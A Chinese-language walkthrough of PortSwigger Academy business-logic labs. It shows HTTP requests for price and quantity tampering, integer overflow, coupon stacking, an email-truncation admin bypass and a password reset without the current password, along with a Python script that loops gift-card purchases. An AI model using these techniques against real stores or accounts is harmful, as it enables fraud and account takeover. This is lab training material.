# Business logic vulnerabilities

## [Lab: Excessive trust in client-side controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls)
### 題目敘述
 This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
竄改 POST 內容

### 解答
在加入購物車時會順便 POST 價格

```
POST /cart HTTP/1.1
Host: acd31fa31fe0b3dcc04314f500560069.web-security-academy.net
Cookie: session=IxPR6nrwBtk0VSUHVKPDmBuwG2IJVK8z
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://acd31fa31fe0b3dcc04314f500560069.web-security-academy.net
Referer: https://acd31fa31fe0b3dcc04314f500560069.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close

productId=1&redir=PRODUCT&quantity=1&price=133700
```

竄改成 1 再去購物車結帳就好ㄌ


## [Lab: High-level logic vulnerability](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level)
### 題目敘述
 This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
控制購買數量，可以是負的

### 解答

加到購物車後，數量的地方 改成買 -1 個

```
POST /cart HTTP/1.1
Host: ac451f941eb06c22c01c81e90025004d.web-security-academy.net
Cookie: session=B4CoFQLL3WfFvWwgwdl1rRca68KNbjPJ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: https://ac451f941eb06c22c01c81e90025004d.web-security-academy.net
Referer: https://ac451f941eb06c22c01c81e90025004d.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close

productId=1&quantity=-2&redir=CART
```

但結帳時他會吐 `Cart total price cannot be less than zero `

所以再買一些普通的小東西讓價格 > 0

發現這樣不行，理論上應該反過來 (用其他商品扣錢) 才能真正買到 

最終買了 `-60` 個 `Vintage Neck Defender` 搭配 `1` 個 `Lightweight "l33t" Leather Jacket`，花了 9.8 元


## [Lab: Low-level logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level)
### 題目敘述
 This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
int overflow

### 解答

測了一下，一次最多可以 `+99`
可以用 Burp 的 intruder 來送，送到他 Overflow

```
POST /cart HTTP/1.1
Host: ac941ffb1fde36c1c0580d1d0037001d.web-security-academy.net
Cookie: session=mSnfLlINi2GcygY9m1mKl9lp8RbLH9vR
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://ac941ffb1fde36c1c0580d1d0037001d.web-security-academy.net
Referer: https://ac941ffb1fde36c1c0580d1d0037001d.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close

productId=1&quantity=99&redir=CART&meow=§§
```

亂測了一下，他的價格是 int32，也就是超過 `2147483647` 就會變成負的

我們要買的東西是 `Lightweight "l33t" Leather Jacket`，價格是 `1337` 元

```
(2**32-1)/1337 = 3212391
np.int32(1337*3212391) = -529

3212391 // 99 = 32448
3212391 % 99 = 39
```

理論上這樣要發 32448 個 +99 的 Requests 跟一個 +39 的 Requests

但測試了一下發現被後的計算 Overflow 會把價格 * 100

也就是說其實計算要把價格用 `133700` 來算


```
(2**32-1)/133700 = 32123.91
np.int32(133700*32123) = -122196

32123 // 99 = 324
32123 % 99 = 47
```

所以要發 324 個 +99 的封包 跟一個 +46 的封包 (因為第一次買時已經 +1 ㄌ)

但真正發可能會有一些掉包的狀況發生，所以就自己湊一下讓 l33t 夾克變成 32123 個

再來湊數字，我買了 `13` 個 `98.26` 元的 `Giant Grasshopper` 以及 `32123` 個 `Lightweight "l33t" Leather Jacket` 最終花了`55.42`元


## [Lab: Inconsistent handling of exceptional input](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-handling-of-exceptional-input)

### 題目敘述
 This lab doesn't adequately validate user input. You can exploit a logic flaw in its account registration process to gain access to administrative functionality. To solve the lab, access the admin panel and delete Carlos. 
 
### 題目解釋
字串長度限制

### 解答

他說我的 email Server 可以收到所有的 `@exploit-aca21fb11eb8dee9c018ae7d01800041.web-security-academy.net`


代表我可以收到

`aaa@aaa.exploit-aca21fb11eb8dee9c018ae7d01800041.web-security-academy.net`

的 email

```
bbb
bbb@bbb.exploit-aca21fb11eb8dee9c018ae7d01800041.web-security-academy.net
bbb
```

進入 `/admin` 會說

```
 Admin interface only available if logged in as a DontWannaCry user 
```



使用 `cyclic 300` 產出長度是 300 的字串

```
ccc
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac@ccc.exploit-aca21fb11eb8dee9c018ae7d01800041.web-security-academy.net
ccc
```

發現這樣註冊，他登入會說我的 email 是

```
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaa
```


希望 Admin 是 `@dontwannacry.com`，`len("@dontwannacry.com")` 是 `17`


所以我們把

```
"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaa"[:-17] + "@dontwannacry.com" = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacja@dontwannacry.com"
```

用來註冊

```
meow
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacja@dontwannacry.com.exploit-aca21fb11eb8dee9c018ae7d01800041.web-security-academy.net
meow
```

這樣我的 email 就會是 `aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacja@dontwannacry.com`

也就可以進 `https://ace31f841e69decdc054ae6c0088006a.web-security-academy.net/admin` 了


## [Lab: Inconsistent security controls](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls)
### 題目敘述
 This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. To solve the lab, access the admin panel and delete Carlos. 
### 題目解釋
限制 email 能進 admin ，先隨便註冊後再改
### 解答

```
test
test@exploit-acc51f3a1e9eb9ddc0401ed7013500cc.web-security-academy.net
test
```

註冊後登入進去發現可以改 email


改成 `meow@dontwannacry.com`


## [Lab: Weak isolation on dual-use endpoint](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
### 題目敘述
 This lab makes a flawed assumption about the user's privilege level based on their input. As a result, you can exploit the logic of its account management features to gain access to arbitrary users' accounts. To solve the lab, access the administrator account and delete Carlos.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
把目前密碼確認給拔掉就能直接改別人的密碼

### 解答

發現修改密碼的地方是登入後

```
csrf=3B72utt3Bri0Hns2LqhZEJd4HpPW8m4L&username=wiener&current-password=peter&new-password-1=peter&new-password-2=peter
```

如果我不送 `current-password` 也可以成功改

```
csrf=3B72utt3Bri0Hns2LqhZEJd4HpPW8m4L&username=administrator&new-password-1=meow&new-password-2=meow
```

然後用 `administrator` 搭配 `meow` 登入


## [Lab: Insufficient workflow validation](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint)
### 題目敘述
 This lab makes flawed assumptions about the sequence of events in the purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
結帳有兩步驟，直接做第二步驟就不會確認金額

### 解答

隨便買一個便宜的東西，他的流程會是

```
POST /cart/checkout HTTP/1.1
Host: ac7d1f1d1e54d2d4c08b013300c70046.web-security-academy.net
Cookie: session=tt3MwcbmHgv04GzBMjLfvgJPOfkBWOsh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Origin: https://ac7d1f1d1e54d2d4c08b013300c70046.web-security-academy.net
Referer: https://ac7d1f1d1e54d2d4c08b013300c70046.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close

csrf=uLmf4CsT7fodHm2TirYLrV2QrMrwttg6
```

```
GET /cart/order-confirmation?order-confirmed=true HTTP/1.1
Host: ac7d1f1d1e54d2d4c08b013300c70046.web-security-academy.net
Cookie: session=tt3MwcbmHgv04GzBMjLfvgJPOfkBWOsh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac7d1f1d1e54d2d4c08b013300c70046.web-security-academy.net/cart
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-Ip: 127.0.0.1
X-Remote-Ip: 127.0.0.1
X-Remote-Addr: 127.0.0.1
Te: trailers
Connection: close

```

買一個 `Lightweight "l33t" Leather Jacket` 放購物車，然後直接送上面的 `GET /cart/order-confirmation?order-confirmed=true`


## [Lab: Authentication bypass via flawed state machine](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-flawed-state-machine)
### 題目敘述
 This lab makes flawed assumptions about the sequence of events in the login process. To solve the lab, exploit this flaw to bypass the lab's authentication, access the admin interface, and delete Carlos.

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋
登入後會需要選擇權限，但如果在進入這個頁面前直接訪問 `/admin` 就可以ㄌ
### 解答

Post 帳密

Drop Redirect

(不然原本會 Redirect 到 Admin)

然後直接訪問

https://ac501f0a1e5b13eac0883491008500b1.web-security-academy.net/admin


## [Lab: Flawed enforcement of business rules](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules)
### 題目敘述
 This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋
優惠券只會檢查有沒有跟最後一張重複

### 解答

進入後會跳

```
 New customers use code at checkout: NEWCUST5
```

購買外套後，在 Coupon 輸入 `NEWCUST5` 發現可以折 5 元

網頁最下面有 `Sign up to our newsletter!`

輸入 `a@a.c` 後會噴 `Use coupon SIGNUP30 at checkout!`

發現 `SIGNUP30` 跟 `NEWCUST5` 可以重複交互使用，但同一張不能連續使用

也就是說，可以

```
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
NEWCUST5	-$5.00
SIGNUP30	-$401.10
```



## [Lab: Infinite money logic flaw](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
### 題目敘述
 This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: wiener:peter 
### 題目解釋

### 解答

下面隨便亂打一個 email 可以取得一張優惠券

Use coupon `SIGNUP30` at checkout!

Gift Card 1 張 10 元

購買後就會跳出禮物卡

全部加值完會變 這樣會變成 `$133.00` 元
理論上寫個腳本一直買禮物卡配 `SIGNUP30`  就可以ㄌ


```bash
curl 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net' -H 'Connection: keep-alive' -H 'Referer: https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/product?productId=2' -H 'Cookie: session=zCH9yeFjV5tmu6mfkAh0QqdjSJSMyuva' -H 'Upgrade-Insecure-Requests: 1' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'TE: Trailers' --data-raw 'productId=2&redir=PRODUCT&quantity=10'

curl 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart/coupon' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net' -H 'Connection: keep-alive' -H 'Referer: https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart' -H 'Cookie: session=zCH9yeFjV5tmu6mfkAh0QqdjSJSMyuva' -H 'Upgrade-Insecure-Requests: 1' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'TE: Trailers' --data-raw 'csrf=g4Ygt1LkGX9YPyC1YaGfEn9RHlnjZdaw&coupon=SIGNUP30'

curl 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart/checkout' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net' -H 'Connection: keep-alive' -H 'Referer: https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart' -H 'Cookie: session=zCH9yeFjV5tmu6mfkAh0QqdjSJSMyuva' -H 'Upgrade-Insecure-Requests: 1' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'TE: Trailers' --data-raw 'csrf=g4Ygt1LkGX9YPyC1YaGfEn9RHlnjZdaw'

curl 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/gift-card' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net' -H 'Connection: keep-alive' -H 'Referer: https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/my-account?id=wiener' -H 'Cookie: session=zCH9yeFjV5tmu6mfkAh0QqdjSJSMyuva' -H 'Upgrade-Insecure-Requests: 1' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Remote-Addr: 127.0.0.1' -H 'TE: Trailers' --data-raw 'csrf=g4Ygt1LkGX9YPyC1YaGfEn9RHlnjZdaw&gift-card=hrcPjOO2Uz'
```

理論上有省時間的方法每次都買到極限，但我懶，我就一次 10 張 10 張慢慢買

```python
import requests
import re


def add_2_chart():
    cookies = {
        'session': 'zCH9yeFjV5tmu6mfkAh0QqdjSJSMyuva',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net',
        'Connection': 'keep-alive',
        'Referer': 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/product?productId=2',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'TE': 'Trailers',
    }

    data = {
    'productId': '2',
    'redir': 'PRODUCT',
    'quantity': '10'
    }

    response = requests.post('https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart', headers=headers, cookies=cookies, data=data)


def add_coupon():
    cookies = {
        'session': 'zCH9yeFjV5tmu6mfkAh0QqdjSJSMyuva',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net',
        'Connection': 'keep-alive',
        'Referer': 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'TE': 'Trailers',
    }

    data = {
    'csrf': 'g4Ygt1LkGX9YPyC1YaGfEn9RHlnjZdaw',
    'coupon': 'SIGNUP30'
    }

    response = requests.post('https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart/coupon', headers=headers, cookies=cookies, data=data)

def checkout():
    cookies = {
    'session': 'zCH9yeFjV5tmu6mfkAh0QqdjSJSMyuva',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net',
        'Connection': 'keep-alive',
        'Referer': 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'TE': 'Trailers',
    }

    data = {
    'csrf': 'g4Ygt1LkGX9YPyC1YaGfEn9RHlnjZdaw'
    }

    response = requests.post('https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/cart/checkout', headers=headers, cookies=cookies, data=data)
    code = re.findall(r'[a-zA-Z0-9]{10}',response.text)
    return code


def push_giftcard(card):
    cookies = {
        'session': 'zCH9yeFjV5tmu6mfkAh0QqdjSJSMyuva',
    }

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net',
        'Connection': 'keep-alive',
        'Referer': 'https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/my-account?id=wiener',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Remote-Addr': '127.0.0.1',
        'TE': 'Trailers',
    }

    data = {
    'csrf': 'g4Ygt1LkGX9YPyC1YaGfEn9RHlnjZdaw',
    'gift-card': card
    }

    response = requests.post('https://ac191f3f1e14d818c08b62e100ee00e9.web-security-academy.net/gift-card', headers=headers, cookies=cookies, data=data)
    # print(response.status_code)


while True:
    add_2_chart()
    print("Add 10 to chart done")
    add_coupon()

    print("Add Coupon done")
    l = checkout()
    l = l[-10:] # last 10 is coupon, other is noise

    print("Gift card :",l)
    for i in l:
        push_giftcard(i)
        print(i, "done")
```

等錢存夠就可以買ㄌ


## [Lab: Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
### 題目敘述
 This lab contains a logic flaw that exposes an encryption oracle to users. To solve the lab, exploit this flaw to gain access to the admin panel and delete Carlos.

You can log in to your own account using the following credentials: wiener:peter 

### 題目解釋

### 解答

還沒寫完
